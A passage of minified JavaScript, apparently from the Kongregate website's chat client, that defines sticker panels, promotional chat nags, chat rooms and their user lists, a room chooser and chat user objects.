n={id:e.id,name:e.alt_text,iconUrl:this._sticker_manager.url(e.id,t,72),type:t};(n=$j($j.parseHTML(ChatDialogue.STICKER_BUTTON_TEMPLATE.evaluate(n)))).on("click",this.onStickerClicked.bind(this,e,t)),n.hover(this.showStickerPopup.bind(this,e,t),this.hideStickerPopup.bind(this)),"shiny"===t||i?this._sticker_pack_shinies.append(n):this._sticker_pack_commons.append(n)},showUserStickers:function(e){if(e){var t=this;this._sticker_pack_commons.empty(),this._sticker_pack_shinies.empty(),["shiny","normal"].forEach((function(i){e[i].forEach((function(e){t.insertStickerNodeIntoTab(e,i)}))})),this._sticker_tabs_node.find('[role="tab"]').attr("aria-selected","false"),this._sticker_tabs_node.find('[data-sticker-pack-id="'+e.id+'"]').attr("aria-selected","true"),this._sticker_market_tab_node.hide(),this._sticker_tab_node.show()}},isStickerTabActive:function(e){return"true"===this._sticker_tabs_node.find('[data-sticker-pack-id="'+e+'"]').attr("aria-selected")},updateRecentStickers:function(){if(this.isStickerTabActive("recent")){var e=this,t=this._sticker_manager.recentStickers||[];this._sticker_pack_commons.empty(),this._sticker_pack_shinies.empty(),t.forEach((function(t){var i=e._sticker_manager.stickers[t.id];i&&e.insertStickerNodeIntoTab(i,t.variant,!0)}))}},showRecentStickers:function(){this._sticker_tabs_node.find('[role="tab"]').attr("aria-selected","false"),this._sticker_tabs_node.find('[data-sticker-pack-id="recent"]').attr("aria-selected","true"),this.updateRecentStickers(),this._sticker_market_tab_node.hide(),this._sticker_tab_node.show()},showStickerUpsell:function(){this._sticker_tabs_node.find('[role="tab"]').attr("aria-selected","false"),this._sticker_tabs_node.find('[data-sticker-pack-id="add"]').attr("aria-selected","true"),this._sticker_tab_node.hide(),this._sticker_market_tab_node.show()},insertStickerCollections:function(){if(this.stickersEnabled()){var e=this;this._sticker_tabs_node.empty(),this._sticker_manager.userStickerCollections.forEach((function(t){var i=$j($j.parseHTML(ChatDialogue.STICKER_TAB_TEMPLATE.evaluate(t)));e._sticker_tabs_node.append(i),i.on("click",e.showUserStickers.bind(e,t,i))})),this.insertRecentStickerButton(),this._recent_stickers_node?this.showRecentStickers():this.showUserStickers(this._sticker_manager.userStickerCollections[0])}},insertRecentStickerButton:function(){var e=this._sticker_manager.recentStickers;e&&e.length&&!this._recent_stickers_node&&((e=$j($j.parseHTML(ChatDialogue.RECENT_STICKER_BUTTON_TEMPLATE.evaluate({})))).on("click",this.showRecentStickers.bind(this)),this._sticker_tabs_node.prepend(e),this._recent_stickers_node=e)},insertAddStickerButton:function(){var e=$j($j.parseHTML(ChatDialogue.STICKER_ADD_BUTTON_TEMPLATE.evaluate({})));e.on("click",this.showStickerUpsell.bind(this)),this._sticker_tabs_node.append(e),this._add_stickers_node=e},scrollStickers:function(e){e=this._sticker_tabs_node.scrollLeft()+e,this._sticker_tabs_node.animate({scrollLeft:e},{duration:125,easing:"linear",queue:!1})},showStickerPopup:function(e,t){var i=this._sticker_pop_node.find("img");this._sticker_pop_node.attr("data-target",t+"-"+e.id),i.attr("src",this._sticker_manager.url(e.id,t,72)),i.attr("alt",e.alt_text),this.updateStickerPopup(),this._sticker_pop_node.show(),$j(document).on("scroll.stickerPopUp",this.updateStickerPopup.bind(this)),$j(this._sticker_tab_node[0]).on("scroll.stickerPopUp",this.updateStickerPopup.bind(this))},updateStickerPopup:function(){var e=this._sticker_pop_node[0].getAttribute("data-target");e=this._parent_node.down("[data-sticker-id="+e+"]").getBoundingClientRect(),this._sticker_pop_node[0].style.top=e.top-10+"px",this._sticker_pop_node[0].style.left=e.left+24+"px"},hideStickerPopup:function(){this._sticker_pop_node.hide(),$j(document).off("scroll.stickerPopUp"),$j(this._sticker_tab_node[0]).off("scroll.stickerPopUp")}},ChatNag=function(e,t){this.initialize(e,t)},ChatNag.prototype={initialize:function(e,t){if(this._chat_window=e,this._chat_nags=t,this._current_increment=0,t.each((function(e){active_user.isPremium()&&e.advertising&&t.splice(t.indexOf(e),1)})),t&&0<t.length){var i=this;this._executer=new PeriodicalExecuter((function(){i.showNag()}),60)}},showNag:function(){var e;if(this._current_increment+=1,this._chat_nags&&0<this._chat_nags.length&&this._current_increment===this._chat_nags.first().spawn_delay){var t=this._chat_nags.shift();if(!this.targetedToDifferentRoom(t)){if(e=null!==t.cnid){var i="kong_cns_"+t.cnid;if(t.suppressible&&Cookie.get(i))return;if(t.per_user_limit){var n="kong_cnul_"+t.cnid,s=parseInt(Cookie.get(n)||0,10);if(s>=t.per_user_limit)return;Cookie.set(n,s+1,t.days_to_expire,"/")}n=parseInt(Cookie.get(Holodeck.KONG_GAMEPLAYS_COOKIE_NAME)||1,10),s="kong_cn_"+t.cnid;var o=parseInt(Cookie.get(s)||0,10);o+=t.frequency}(!e||o<=n)&&(this._chat_window.showChatNag(this.prepareNagContent(t),(function(){var e=$("nag_supress_control_"+t.cnid);e&&e.observe("click",(function(e){return $("nag_wrapper_"+t.cnid).hide(),Cookie.set(i,"true",t.days_to_expire,"/"),Event.stop(e),!1}))})),this._chat_window.recordAnalyticsEvent("ChatNag",t.name),e&&(Cookie.set(s,n,t.days_to_expire,"/"),t.has_campaign_cap&&new Ajax.Request("/chat_nags/"+t.cnid+"/increment",{method:"post"})))}}},prepareNagContent:function(e){var t=(new Date).getTime();t=e.nag_content.gsub("TIMESTAMP",t);var i=new Template('<div id="nag_wrapper_#{cnid}" class="chat_nag"><a title="Do not show this again" id="nag_supress_control_#{cnid}" class="nag_supress_control">X</a>#{content}</div>');return e.suppressible&&(t=i.evaluate({cnid:e.cnid,content:t})),t},updateDefaultNag:function(e){this._chat_nags&&0!==this._chat_nags.length&&null===this._chat_nags[0].cnid&&(this._chat_nags[0]=e)},targetedToDifferentRoom:function(e){return!e.targeted_room_id.blank()&&e.targeted_room_id!==this._chat_window.activeRoom().id()}},ChatRoom=function(e,t){this.initialize(e,t)},ChatRoom._generateTemplate=function(){this._template||(this._template=$$(".chat_room_template")[0])},ChatRoom.template=function(){return this._generateTemplate(),this._template.cloneNode(!0)},ChatRoom.updateTemplateSilenceScheduledEnd=function(e){this._generateTemplate(),this._template.down(".silence_duration").update(tr("You have been silenced for "+e))},ChatRoom.initializeTemplates=function(){ChatRoom.USER_ROW_TEMPLATE||(ChatRoom.USER_ROW_TEMPLATE=new Template($("user_row_template").innerHTML),ChatRoom.ADMIN_MESSAGE_TEMPLATE=new Template($("admin_message_template").innerHTML))},ChatRoom.prototype={initialize:function(e,t){this._chat_window=e,this._room=t,this._users={},this._users_list=[],this._guests_in_room_count=this._users_in_room_count=0,this._favorite_room=e.isFavoriteRoom(t.id),this._node=ChatRoom.template(),ChatRoom.initializeTemplates(),this._users_in_room_node=this._node.down(".users_in_room"),this._guests_in_room_node=this._node.down(".guest_count_in_room"),this._number_in_room_node=e._chat_window_node.down(".number_in_room"),this._guest_count_holder=this._node.down(".guest_count_holder"),this._silence_duration_node=this._node.down(".silence_duration"),this._chat_actions_node=new Element("div").setStyle({display:"none"}).update($("chat_actions_dropdown_template").innerHTML),this._chat_actions_options=this._chat_actions_node.down("ul.chat_actions_list"),this._chat_actions_control=this._chat_actions_node.down("span.btn");var i=this;this._chat_actions_control.observe("click",(function(){$j(i._chat_actions_options).toggle()})),document.observe("click",(function(e){e.target.hasClassName("btn_target")||$j(i._chat_actions_options).hide()})),$("chat_actions_container").insert(this._chat_actions_node),this._chat_actions_options.select(".exclude_"+this.type()).invoke("remove"),this._favorite_room_option_node=this._chat_actions_options.down(".favorite_room"),this._tab_for_room=this._chat_window.tabForRoom(this),this._unread_message_node=this._tab_for_room.down(".unread_chat_messages"),this._favorite_room_option_node&&this._favorite_room&&this._favorite_room_option_node.writeAttribute("data-chat-action","unfavorite_room").update(tr8nProxy.trl("Unfavorite room"));var n=function(e){i.addToFavorites(),e.stop()},s=function(t){e.showOnlineFriends(),t.stop()};this._chat_actions_options.observe("click",(function(t){var o=$j(t.target);switch(o.is("li")||(o=o.parent("li")),o.attr("data-chat-action")){case"room_chooser":e.activateRoomChooser();break;case"leave_private":i.isMyPrivateRoom()?holodeck.destroyPrivateRoom():holodeck.leavePrivateRoom();break;case"leave_guild":holodeck.leaveGuildRoom();break;case"friends_online":(o=CapturesToInlineRegistration.decorate(s))(t);break;case"room_details":e.activateRoomInfo(i),t.stop();break;case"favorite_room":t.stop(),(o=CapturesToInlineRegistration.decorate(n))(t);break;case"unfavorite_room":i.removeFromFavorites(),t.stop();break;case"set_status":KonduitPresenceType.AWAY==i._presence?e.holodeck().setPresenceChat():e.holodeck().setPresenceAway()}i._chat_actions_options.hide()})),this._users_in_room_node.on("mouseover",".js-user-chat-hover",(function(t){var n=t.target.getAttribute("username");n&&n.toLowerCase()!=i.username().toLowerCase()&&(n=i.user(n),e.showUserRollover(n,t.target),Event.stop(t))})),this._users_in_room_node.observe("mouseout",(function(t){e.hideUserRollover(),Event.stop(t)})),this._users_in_room_node.on("click",".username",(function(t){var i=t.target.getAttribute("username");i&&(e.showProfile(i),Event.stop(t))})),this._messages_to_retain=parseInt(document.location.href.parseQuery().messages_to_retain,10)||200,this._chat_dialogue=new ChatDialogue(this._node,(function(e){i.sendRoomMessage(e)}),this.holodeck(),this._chat_window,this),e._chat_rooms_container_node.insert({bottom:this._node}),this._history_button=$j(this._node).find(".chat_message_window .history-button"),this._history_spinner=$j(this._node).find(".chat_message_window .history-spinner"),this.isGuildRoom()&&(this.showHistoryButton(),this._history_button.on("click",(function(){i._history_button.hide(),i._history_spinner.show(),i.fetchHistory()})))},showHistoryButton:function(){this._history_button.show(),this._history_spinner.hide()},hideHistoryButton:function(){this._history_button.hide(),this._history_spinner.hide()},destroy:function(){this._node.remove(),this._chat_actions_node.remove()},chatEnabled:function(){return this._chat_enabled},disable:function(){this._chat_dialogue.disable(),this._chat_enabled=!1},disableDueToGuest:function(){this._node.down(".guest_chat_controls").show(),this.disable()},disableDueToSilence:function(){this.isPrivate()||(this._node.down(".silenced_chat_controls").show(),this.disable())},disableDueToFayeDisconnect:function(){this.disconnectedFromFaye=!0,this._node.down(".faye_disconnect_controls").show(),this.disable()},enableDueToFayeConnect:function(){this.disconnectedFromFaye=!1,this.enable()},enable:function(){this._node.down(".guest_chat_controls").hide(),this._node.down(".silenced_chat_controls").hide(),this._node.down(".faye_disconnect_controls").hide(),this._chat_dialogue.enable(),this._chat_enabled=!0},username:function(){return this._chat_window.username()},id:function(){return this._room.id},name:function(){return this._room.name},xmppName:function(){return this._room.xmpp_name},shortName:function(){return this._short_room_name||(this._short_room_name="room_"+this._room.xmpp_name),this._short_room_name},type:function(){return this._room.type},isGuildRoom:function(){return"guild"===this._room.type},supportsStickers:function(){return!this.isGuildRoom()},guildId:function(){if("guild"==this.type())return Holodeck.guildIdFromXmppName(this.xmppName());console.error("Attempted to check guildId for non guild room")},konduit:function(){return this._chat_window.konduit()},isPrivate:function(){return"private"==this.type()},isMyPrivateRoom:function(){return this.isPrivateRoomOwner(this.username())},isPrivateRoomOwner:function(e){if(this.isPrivate()&&e)try{var t=this.xmppName(),i=t.substr(t.indexOf("-")+1);return i&&i.toLowerCase()==e.toLowerCase()}catch(e){}return!1},privateRoomOwnerUsername:function(){if(this.isPrivate())try{return this.name().split("'")[0]}catch(e){}return null},dispatchEvent:function(e){this.konduit().dispatchEvent(e)},insert:function(e,t){this._chat_dialogue.insert(e,t)},receivedAdminMessage:function(e){this._chat_dialogue.insert(ChatRoom.ADMIN_MESSAGE_TEMPLATE.evaluate({content:e.data.admin_message}))},fetchHistory:function(){holodeck.konduit().dispatchEvent({type:KonduitEvent.FETCH_HISTORY,data:{room:this._room,maxTime:this._chat_dialogue.earliestTimestamp()}})},sendRoomMessage:function(e){e&&this.dispatchRoomMessage(this._chat_window.escapeOutgoingMessage(e))},sendSticker:function(e,t){if(this.supportsStickers()){this.holodeck()._sticker_manager.trackRecentSticker(e,t);var i=this.holodeck()._sticker_manager.stickers[e];i=this.holodeck()._sticker_manager.userStickerPacks[i.sticker_pack_id][t],this.dispatchRoomMessage({stickerId:e,stickerVariant:t,level:i.shiny_level,quality:i.quality,stickerPackName:i.stickerPack.name})}},dispatchRoomMessage:function(e){this.holodeck()._sticker_manager.performDailyActivity("chat_message"),this.dispatchEvent({type:KonduitEvent.ROOM_MESSAGE,data:{message:e,room:this._room}})},receivedMessage:function(e){this.isActive()||this._unread_message_node.show(),this.checkUserForModeration(e.data.user.username),this._chat_dialogue.displayMessage(e.data.user.username,e.data.message,{},{characterName:e.data.user.variables.game_character_name,timestamp:e.data.timestamp})},receivedSystemMessage:function(e){this.isActive()||this._unread_message_node.show(),this._chat_dialogue.displaySystemMessage(e.data.data,e.data.timestamp)},checkUserForModeration:function(e){this.self()?this.canUserModerate(this.self())&&this._chat_window.noticedModeratableUser(e):this.checkUserForModeration.bind(this).delay(500,e)},messageError:function(e){this.insert(this._chat_window.errorMessageTemplate(e.data.errorType))},_avatarSrc:function(e){return e.chatAvatarUrl()},_avatarStyle:function(e){return""},_generateUserNode:function(e){var t=this._chat_window,i=e.username;i={rowClasses:[],avatarSrc:this._avatarSrc(e),avatarStyle:this._avatarStyle(e),userNodeId:this.userNodeId(i),usernameNodeId:this.usernameNodeId(i),username:i,level:e.level()},e.gameCharacterName()&&(i.game_character_name="("+e.gameCharacterName()+")"),e.isSilenced()&&i.rowClasses.push("silenced"),KonduitPresenceType.AWAY==e.presence()&&i.rowClasses.push("away"),t.isMuted(e)&&i.rowClasses.push("muted");var n={};e.isAdmin()?n={extraIconClass:"spritesite admin_icon",extraIconType:"Administrator",extraIconTitle:"Administrator"}:this.owner()==e.username?n={extraIconClass:"spritesite room_owner_icon",extraIconType:"Room Owner",extraIconTitle:"Room Owner"}:this.canUserModerate(e)?n={extraIconClass:"spritesite moderator_icon",extraIconType:"Moderator",extraIconTitle:"Moderator"}:e.isDeveloper()&&(n={extraIconClass:"spritesite developer_icon",extraIconType:"Developer",extraIconTitle:"Developer"}),i=Object.extend(i,n),n=ChatRoom.USER_ROW_TEMPLATE;var s=e.specialChatVars();if(s){var o=(active_user.username()==e.username?"You've":e.username)+" completed",a=[];s.chat_icons&&(s.chat_icons.each((function(e){e.message=o;var t='<img src="#{image_url}" alt="#{message} #{subject_name}" title="#{message} #{subject_name}" class="#{slug} rank_icon" />'.interpolate(e);"kartridge-charter"==e.slug&&(t='<a href="https://www.kartridge.com" target="_blank">'+t+"</a>"),a.push(t)})),i.extraIconTags=a.join(""))}return n=new Element("div",{id:i.userNodeId,class:"user_row "+i.rowClasses.join(" ")}).update(n.evaluate(i)),t.isFriend(e)||n.down(".friend_icon").remove(),i.extraIconType||n.down(".rank_icon").remove(),e.isPremium()?active_user.premiumizeUpsellNode(n.down(".premium_icon"),"username_icon","icon_tab"):n.down(".premium_icon").remove(),e.isMobile()||n.down(".mobile_icon").remove(),e.isGuest()&&n.down(".username").remove(),n},self:function(){return this._users[this.username().toLowerCase()]},removeUser:function(e){(e=e.userRowNode?e:this.user(e.username))&&(this.removeUserNode(e),delete this._users[e.username.toLowerCase()],this._users_list.orderedDelete(e,this.userSorter()))},removeUserNode:function(e){(e=this.user(e.username))&&e.userRowNode()&&e.userRowNode().remove()},isGuest:function(e){return this._chat_window.isGuest(e)},userSorter:function(){var e=this._chat_window,t=this,i=function(t){return e.username()==t.username},n=function(e){return!e.isSilenced()},s=function(e){return e.isAdmin()},o=function(e){return!e.isAdmin()&&t.canUserModerate(e)},a=function(t){return e.isFriend(t)},r=function(t){return!e.isMuted(t)},c=function(e){return e.isAway()},h=function(e,t,i){return t=e(t),e=e(i),t&&!e?-1:!t&&e?1:0};return function(e,t){return h(i,e,t)||h(n,e,t)||h(s,e,t)||h(o,e,t)||h(a,e,t)||h(r,e,t)||e.username.toLowerCase().localeCompare(t.username.toLowerCase())||h(c,e,t)}},updateUser:function(e,t){if(!this.isGuest(e)){var i=this.userSorter(),n=this._users[e.username.toLowerCase()];if(e=e.variables?new ChatUser(e.variables):e,t||!n||0!==i(n,e)){var s,o;n&&(this.removeUserNode(e),this._users_list.orderedDelete(n,i)),this._users[e.username.toLowerCase()]=e,e.setUserRowNode(this._generateUserNode(e));try{var a=this._users_list.orderedInsert(e,i);0<a&&(o=(s=this._users_list[a-1])?s.userRowNode():null)&&$j(o).after(e.userRowNode()),o||$j(e.userRowNode()).prependTo(this._users_in_room_node)}catch(e){Kongregate.Log.error("Error adding user to list",e,a,s,o)}if(e.username==this._chat_window.username()){if(this._presence!=e.presence())switch(e.presence()){case KonduitPresenceType.CHAT:this._chat_dialogue.kongBotMessage("Set status to active"),$j("[data-chat-action=set_status]").html(tr8nProxy.trl("Set status")+":"+tr8nProxy.trl("Away"));break;case KonduitPresenceType.AWAY:this._chat_dialogue.kongBotMessage("Set status to away"),$j("[data-chat-action=set_status]").html(tr8nProxy.trl("Set status")+":"+tr8nProxy.trl("Active"))}this._presence=e.presence()}}}},updateRoomHeader:function(){this._chat_window._chat_window_node.down(".room_name").innerHTML=this.name(),this.updateUsersCount()},updateUsersCount:function(){this.isActive()&&this._number_in_room_node.update(this._users_list.length+this._guests_in_room_count)},updateGuestCount:function(e){e&&this.setGuestCount(this._guests_in_room_count+e)},guestCountUpdated:function(e){this.setGuestCount(e.data.guests)},setGuestCount:function(e){0<=e&&(this._guests_in_room_count=e),e=" guests in room",1==this._guests_in_room_count&&(e=" guest in room"),0<this._guests_in_room_count?(this._guest_count_holder.show(),this._guests_in_room_node.update(this._guests_in_room_count+e)):this._guest_count_holder.hide()},updateSilenceScheduledEnd:function(e){this._silence_duration_node.update(tr("You have been silenced for "+e))},isSilenced:function(){return this._chat_window.isSilenced()},userJoined:function(e){e=e.data.user,this.user(e.username)||this.updateUser(e),this.isGuest(e)&&this.updateGuestCount(1),this.updateUsersCount()},userChanged:function(e){this.updateUser(e.data.user,e.data.force||e.data.user.variables.force)},userLeft:function(e){e=e.data.user,this.isGuest(e)||(this.removeUser(e),this.isMyPrivateRoom()&&delete holodeck._users_invited[e.username]),this.isGuest(e)&&this.updateGuestCount(-1),this.updateUsersCount()},updateChatControlsForUser:function(e){e.username==this.username()&&(e.isSilenced()||this.enable(),this.isGuest(e)&&this.disableDueToGuest())},userListScrollTop:function(){return this._users_in_room_node.scrollTop},user:function(e){return this._users[e.toLowerCase()]},users:function(){return this._users_list},addFriends:function(e){this.refreshUsers(e)},removeFriends:function(e){this.refreshUsers(e)},addMutings:function(e){this.refreshUsers(e)},refreshUsers:function(e){for(var t,i=[],n=0,s=e.length;n<s;n++)(t=this.user(e[n]))&&(this.removeUser(t),i.push(t));for(n=0,s=i.length;n<s;n++)this.userChanged({data:{user:i[n],force:!0}})},hide:function(){this._node.hide(),this._chat_actions_node.hide(),this._tab_for_room.removeClassName("active")},show:function(){this._node.show(),this.updateRoomHeader(),this._chat_actions_node.show(),this._tab_for_room.addClassName("active"),this._unread_message_node.hide(),this.scrollToBottom()},showChatNag:function(e,t){this.insert(e,t)},owner:function(){return this._chat_window.roomOwner(this._room.id)},holodeck:function(){return this._chat_window.holodeck()},insertInChatInput:function(e){this._chat_dialogue.setInput(e)},addToFavorites:function(){this._chat_window.recordAnalyticsEvent("ChatAction","FavoriteRoom"),new Ajax.Request("/rooms/"+this._room.id+"/favorite_rooms",{asynchronous:!0,evalScripts:!0,method:"post"}),this._favorite_room_option_node.writeAttribute("data-chat-action","unfavorite_room").update(tr8nProxy.trl("Unfavorite room")),this._chat_window.addFavoriteRooms([this._room.id])},removeFromFavorites:function(){new Ajax.Request("/rooms/"+this._room.id+"/unfavorite_rooms",{asynchronous:!0,method:"post"}),this._favorite_room_option_node.writeAttribute("data-chat-action","favorite_room").update(tr8nProxy.trl("Favorite this room")),this._chat_window.removeFavoriteRoom(this._room.id)},userNodeId:function(e){return"user_"+e+"_"+this.shortName()},usernameNodeId:function(e){return"username_"+this.userNodeId(e)},getId:function(){return this._room.id},scrollToBottom:function(){this._chat_dialogue.scrollToBottom()},isActive:function(){return this==this._chat_window.activeRoom()},roomId:function(){return parseInt(this._room.id)},isGameRoom:function(){return"game"==this._room.type},gameId:function(){return this.isGameRoom()?this._room.game_id||parseInt(this._room.id.match(/^\d+/)[0],10):null},canUserModerate:function(e){if(!e)return!1;var t=e.moderatorRoomIds();return e=e.moderatorGameIds(),"all"==t||"all"==e||(this.isGameRoom()?e.include(this.gameId()):t.include(this.roomId()))}},ChatRoomChooser=function(e){this.initialize(e)},ChatRoomChooser.DESCRIPTION_TOP_FUDGE=9,ChatRoomChooser.prototype={initialize:function(e){if(this._chat_window=e.chat_window,this._node=$("chat_room_chooser"),this._holodeck=e.holodeck,this._node){this._rooms_list_node=this._node.down(".rooms_list"),(this._room_description_rollover_node=this._rooms_list_node.down(".room_description_rollover_container"))&&(this._room_description_rollover_content=this._room_description_rollover_node.down(".room_description_rollover_content"));var t=this,i=this._holodeck;this._node.down(".return_to_room").observe("click",(function(e){t.deactivate(),e.stop()})),this._rooms_list_node.observe("click",(function(e){var n=e.target;n.hasClassName("room")||(n=n.up(".room")),!n||n.hasClassName("full")&&!i.isChatModerator()||(t._chat_window.recordAnalyticsEvent("ChatAction","ChangeRoom"),t.joinRoom(n)),e.stop()})),this._room_groups=$H()}},isActive:function(){return this._node.visible()},activate:function(e){e&&this._node.down(".room_name").update(e.name()),this._chat_window.hideChatWindow(),this.requestJoinableRooms(),this.clearGroups(),this._chat_window.setActiveTempPane(this),this.show()},deactivate:function(){this.hide(),this._chat_window.clearActiveTempPane(),this._chat_window.showChatWindow()},show:function(){this._node.ieHappyShow()},hide:function(){this._node&&this._node.ieHappyHide()},clearGroups:function(){$H(this._room_groups).each((function(e){(e=e[1]).clearRooms(),e._node.hide()}))},roomGroups:function(e){this.clearGroups();for(var t=0,i=e.length;t<i;t++)this.addRoomGroup(e[t])},redoRoomList:function(){this.clearGroups(),this.isActive()&&this.requestJoinableRooms()},addRoomGroup:function(e){var t=this._rooms_list_node,i=this,n=this._room_groups.getWithDefault(e.name,(function(){return new ChatRoomGroup(i,t,e)}));n.setRooms(e.rooms),n.show(),e.expand&&n.open()},requestJoinableRooms:function(){this._chat_window.showSpinner();var e=this._chat_window;new Ajax.Request("/rooms.js?game_id="+this.holodeck().gameId(),{method:"get",onComplete:e.hideSpinner})},roomGroup:function(e){return this._room_groups.get(e)},joinRoom:function(e){var t=e.room;(e=$j(e).data("guild-room"))?this.holodeck().joinRoom(e):t.premium_only&&!active_user.isPremium()?lightbox.prototype.initializePremiumMembershipPurchase("premium_only_chatroom","chat_features_tab"):this.holodeck().joinRoom(t)},holodeck:function(){return this._holodeck},showDescriptionRollover:function(e,t){this._room_description_rollover_content.update(e),this.setDescriptionRolloverPosition(t),this._room_description_rollover_node.show()},hideDescriptionRollover:function(){this._room_description_rollover_content.update(""),this._room_description_rollover_node.hide()},beginDescriptionRolloverHide:function(){var e=this;this._room_rollover_hide_timer&&clearTimeout(this._room_rollover_hide_timer),this._room_rollover_hide_timer=setTimeout((function(){e.hideDescriptionRollover()}),5e3)},stopDescriptionRolloverHide:function(){clearTimeout(this._room_rollover_hide_timer)},setDescriptionRolloverPosition:function(e){var t=this._rooms_list_node.scrollTop;e=e.positionedOffset()[1];var i=e-=ChatRoomChooser.DESCRIPTION_TOP_FUDGE;t<e&&(i=e-t),this._room_description_rollover_node.setStyle({top:i+"px"})}},ChatRoomGroup=function(e,t,i){this.initialize(e,t,i)},ChatRoomGroup.template=function(){return this._template||(this._template=$$(".joinable_rooms_group")[0]),this._template.cloneNode(!0)},ChatRoomGroup.prototype={initialize:function(e,t,i){this._name=i.name,this._chooser=e,e=ChatRoomGroup.template(),t.insert(e),i.move_to_top?t.insert({top:e}):t.insert({bottom:e}),this._node=e,this._list_node=e.down(".rooms"),this._panel=new CollapsiblePanel(e),e.down(".group_name").update(this._name)},setRooms:function(e){var t=this._list_node,i=this._chooser;i.holodeck();var n=this;e.each((function(e,s){var o=n.buildRoomNode(e);t.insert(o),e.description&&(o.observe("mouseover",(function(t){i.showDescriptionRollover(e.description,o),Event.stop(t)})),o.observe("mouseout",(function(e){i.beginDescriptionRolloverHide(),Event.stop(e)})))}))},buildRoomNode:function(e){return"guild"===e.type?this.buildGuildRoomNode(e):this.buildRegularRoomNode(e)},buildGuildRoomNode:function(e){var t=$j("#js-guild-room-template li").clone();return t.find(".js-name").html(e.game_title+": "+e.guild_name),t.data("guild-room",e),t[0]},buildRegularRoomNode:function(e){var t=new Element("li",{class:0==i%2?"even room":"odd room"});t.room=e;var n=new Element("p",{class:"name"}).update(e.name);return e.premium_only&&(active_user.isPremium()||n.addClassName("upsell"),n.addClassName("premium_room_icon spritesite")),"game"===e.type&&"en"!==e.language&&"any"!=e.language&&(n.insert("&nbsp;"),n.insert(new Element("em").update("<strong>("+e.language+")</strong>"))),t.insert(n),e.joinable?t.insert(new Element("p",{class:"user_count"}).update(e.total_user_count)):(t.insert(new Element("p",{class:"user_count"}).update("full")),holodeck.isChatModerator()?t.addClassName("mod_full"):t.addClassName("full")),t.insert(new Element("div",{style:"clear:both;"})),t},node:function(){return this._node},clearRooms:function(){this._list_node.select(".room").each((function(e){e.remove()}))},show:function(){this._node.show()},hide:function(){this._node.hide()},open:function(){this._panel.open()}},ChatUser=function(e){this.initialize(e)},ChatUser.prototype={initialize:function(e){this.username=e.username,this._game_url=e.game_url,this._game_title=e.game_title,this._chat_avatar_url=e.chat_avatar_url,this._admin=e.admin,this._developer=e.developer,this._premium=e.premium,this._role=e.role,this._presence=e.presence,this._level=e.level,this._game_character_name=e.game_character_name,this._mobile=e.mobile,this._special_chat_vars=null;try{this._special_chat_vars="object"==typeof e.special_chat_vars?e.special_chat_chars:e.special_chat_vars.evalJSON()}catch(t){if("undefined"!=typeof console)try{console.log("Could not parse variables object %o",e.special_chat_vars)}catch(e){}}this._moderator_room_ids=e.moderator_room_ids||[],this._moderator_game_ids=e.moderator_game_ids||[]},gameCharacterName:function(){return this._game_character_name},gameUrl:function(){return this._game_url},gameTitle:function(){return this._game_title},chatAvatarUrl:function(){return this._chat_avatar_url},isAdmin:function(){return this._admin},isDeveloper:function(){return this._developer},isPremium:function(){return this._premium},isMobile:function(){return this._mobile},isGuest:function(){return this.username.match(/^_/)},role:function(){return this._role},level:function(){return this._level},presence:function(){return this._presence},specialChatVars:function(){return this._special_chat_vars},moderatorRoomIds:function(){return this._moderator_room_ids},moderatorGameIds:function(){return this._moderator_game_ids},isSilenced:function(){return"participant"!=this.role()&&"moderator"!=this.role()},isAway:function(){return KonduitPresenceType.AWAY==this.presence()},changeRole:function(e){this._role=e},setUserRowNode:function(e){this._user_row_node=e},userRowNode:function(){return this._user_row_node}},ChatWindow=function(e){this.initialize(e)},ChatWindow.MODERATABLE_TIME_LIMIT=18e5,ChatWindow.prototype={initialize:function(e){e.chat_window=this,this._holodeck=e.holodeck,this._friends={},this._mutings={},this._rooms=new Hash,this._room_owners={},this._node=$("chat_tab_pane"),this._chat_window_node=$("chat_window"),this._chat_rooms_container_node=$("chat_rooms_container"),this._rooms_to_join=[],this._favorite_rooms=[],this._rooms_by_type={},this._chat_tab_clicked=this._logged_in_to_chat=!1,this._room_chooser=new ChatRoomChooser(e),this._user_rollover_manager=new UserRollover(this),this._mini_profile=new MiniProfile(e),this._online_friends=new OnlineFriends(this),this._room_info=new RoomInfo(e),this._moderatableUsers={},this._moderatableUsersSweeper=null,this._chat_bootstrap_url=e.chat_bootstrap_url,this._seen=!1,this._deferred_room_params={},this._deferred_room_callbacks={},this.LAST_VIEWED_TAB_COOKIE="kong_chat_tab",this.GENERAL_CHAT_ROOM="chat",this.GAME_CHAT_ROOM="game",this.GUILD_CHAT_ROOM="guild",this.PRIVATE_CHAT_ROOM="private",this.SINGLE_PLAYER_GAME="spg",this.MULTIPLAYER_GAME="mpg",this.GUILD_GAME="guilds",this._activeTabMatrix={},this._activeTabMatrix[this.SINGLE_PLAYER_GAME]={},this._activeTabMatrix[this.SINGLE_PLAYER_GAME][this.GENERAL_CHAT_ROOM]=this.GENERAL_CHAT_ROOM,this._activeTabMatrix[this.SINGLE_PLAYER_GAME][this.GAME_CHAT_ROOM]=this.GENERAL_CHAT_ROOM,this._activeTabMatrix[this.SINGLE_PLAYER_GAME][this.GUILD_CHAT_ROOM]=this.GUILD_CHAT_ROOM,this._activeTabMatrix[this.SINGLE_PLAYER_GAME][this.PRIVATE_CHAT_ROOM]=this.PRIVATE_CHAT_ROOM,this._activeTabMatrix[this.MULTIPLAYER_GAME]={},this._activeTabMatrix[this.MULTIPLAYER_GAME][this.GENERAL_CHAT_ROOM]=this.GAME_CHAT_ROOM,this._activeTabMatrix[this.MULTIPLAYER_GAME][this.GAME_CHAT_ROOM]=this.GAME_CHAT_ROOM,this._activeTabMatrix[this.MULTIPLAYER_GAME][this.GUILD_CHAT_ROOM]=this.GUILD_CHAT_ROOM,this._activeTabMatrix[this.MULTIPLAYER_GAME][this.PRIVATE_CHAT_ROOM]=this.PRIVATE_CHAT_ROOM,this._activeTabMatrix[this.GUILD_GAME]={},this._activeTabMatrix[this.GUILD_GAME][this.GENERAL_CHAT_ROOM]=this.GUILD_CHAT_ROOM,this._activeTabMatrix[this.GUILD_GAME][this.GAME_CHAT_ROOM]=this.GUILD_CHAT_ROOM,this._activeTabMatrix[this.GUILD_GAME][this.GUILD_CHAT_ROOM]=this.GUILD_CHAT_ROOM,this._activeTabMatrix[this.GUILD_GAME][this.PRIVATE_CHAT_ROOM]=this.PRIVATE_CHAT_ROOM;var t=this;this._chat_bootstrap_url&&this.bootstrapChat.bind(this).runWhenDomLoaded(!0),$$("#chat_room_tabs .chat_room_tab").each((function(e){e.down("a").observe("click",(function(i){var n=e.id.split("_")[0],s=t.roomByType(n),o=["guild","chat","game"],a=function(e){return e===n};return 